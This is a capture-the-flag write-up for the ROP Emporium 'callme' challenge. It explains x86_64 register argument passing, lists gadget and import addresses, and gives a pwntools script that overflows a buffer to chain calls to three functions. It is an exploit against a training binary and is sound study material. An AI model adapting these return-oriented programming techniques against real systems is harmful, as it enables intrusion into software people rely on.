# CALLME

[callme](https://ropemporium.com/challenge/callme.html)

Instead of one argument, we now need to pass in **THREE** arguments to a function now! And now there are 3 functions to return to!?

Don't fret. All of the knowledge from the last 2 challenges should be able to carry us forward through this challenge and we don't have to worry too much about the Procedure Linkage Table just yet. And because we are not using the x86 32 bit architecture, we don't have to pass arguments through the stack, which would make everything excruciatingly harder.

Remember this [article](https://en.wikipedia.org/wiki/X86_calling_conventions#System_V_AMD64_ABI) about the x86_64 calling convention? This will be very important for what we're going to do next. Since we have 3 arguments to pass into each function, we need to somehow pop them into the `rdi`, `rsi` and `rdx` registers, before returning to `callme_one`, `callme_two` or `callme_three`.

Let's start looking for gadgets and functions now!

```
$ ROPgadget --binary ./callme | grep "pop rdi"
0x000000000040093c : pop rdi ; pop rsi ; pop rdx ; ret
0x00000000004009a3 : pop rdi ; ret
```

```
$ ROPgadget --binary ./callme | grep ": ret$"  
0x00000000004006be : ret
```

```
$ rabin2 -i ./callme
[Imports]
nth vaddr      bind   type   lib name
―――――――――――――――――――――――――――――――――――――
1   0x004006d0 GLOBAL FUNC       puts
2   0x004006e0 GLOBAL FUNC       printf
3   0x004006f0 GLOBAL FUNC       callme_three
4   0x00400700 GLOBAL FUNC       memset
5   0x00400710 GLOBAL FUNC       read
6   0x00000000 GLOBAL FUNC       __libc_start_main
7   0x00400720 GLOBAL FUNC       callme_one
8   0x00000000 WEAK   NOTYPE     __gmon_start__
9   0x00400730 GLOBAL FUNC       setvbuf
10  0x00400740 GLOBAL FUNC       callme_two
11  0x00400750 GLOBAL FUNC       exit
```

Let's take a look at what we have:

```
0x40093c : pop rdi ; pop rsi ; pop rdx ; ret
0x4006be : ret
0x400720 : callme_one
0x400740 : callme_two
0x4006f0 : callme_three
0xdeadbeefdeadbeef : argument 1
0xcafebabecafebabe : argument 2
0xd00df00dd00df00d : argument 3
```

This should be all that is necessary to create our buffer overflow.

```python
# ./win.py
from pwn import *
...
POP = p64(0x40093c)
RET = p64(0x4006be)
ARG1 = p64(0xdeadbeefdeadbeef)
ARG2 = p64(0xcafebabecafebabe)
ARG3 = p64(0xd00df00dd00df00d)
attack = b"A"*0x28
# callme_one
attack += POP + ARG1 + ARG2 + ARG3 + RET + p64(0x400720)
# callme_two
attack += POP + ARG1 + ARG2 + ARG3 + RET + p64(0x400740)
# callme_three
attack += POP + ARG1 + ARG2 + ARG3 + RET + p64(0x4006f0)
io.sendline(attack)
...
```